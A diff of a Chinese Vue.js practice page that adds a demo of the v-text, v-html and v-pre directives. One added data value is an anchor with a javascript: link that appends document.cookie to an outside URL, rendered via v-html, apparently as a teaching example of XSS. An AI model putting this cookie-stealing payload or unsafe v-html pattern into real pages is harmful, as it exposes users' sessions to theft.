@@ -31,6 +31,14 @@
         <p>过滤器展示时间：{{time | timeFormat('YYYY_MM_DD') }}</p>
         <p>过滤器展示时间：{{time | timeFormat('YYYY_MM_DD') | mySlice }}</p>
 
+        <div>
+            <h2>指令学习</h2>
+            名字(v-text)：<span v-text="name"></span>
+            <br>
+            名字(v-html)：<span v-html="str"></span>  <span v-html="str1"></span>  
+            <span v-pre>{{name}}</span>
+        </div>
+
         <h2>人员列表</h2>
         查询 <input type="text" v-model="personName">  <br>
 
@@ -41,6 +49,7 @@
         <ul>
             <li v-for="person in filterPersons" :key="person.id">{{person.name}} --- 年龄 {{person.age}}</li>
         </ul>
+     
     </div>
 
     <script type="text/javascript">
@@ -63,7 +72,10 @@
                 personName: '',
                 // filterPersons: [],
                 sortType: 0,
-                time: 1727661358057
+                time: 1727661358057,
+                name: 'VSCode',
+                str: '<h3>VSCode</h3>',
+                str1: '<a href=javascript:location.href="http://www.baidu.com"+ document.cookie> 点击</a>'
             },
             methods: {
                
